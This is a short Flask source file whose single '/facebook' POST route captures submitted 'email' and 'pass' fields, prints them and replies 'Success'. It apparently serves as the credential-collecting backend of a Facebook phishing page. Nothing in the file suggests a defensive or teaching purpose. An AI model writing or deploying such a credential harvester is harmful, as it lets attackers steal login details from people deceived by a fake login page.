from flask import Flask, request

app = Flask(__name__)

@app.route("/facebook", methods=["POST"])
def facebook():
  print(request.form.get("email"))
  print(request.form.get("pass"))

  return "Success"
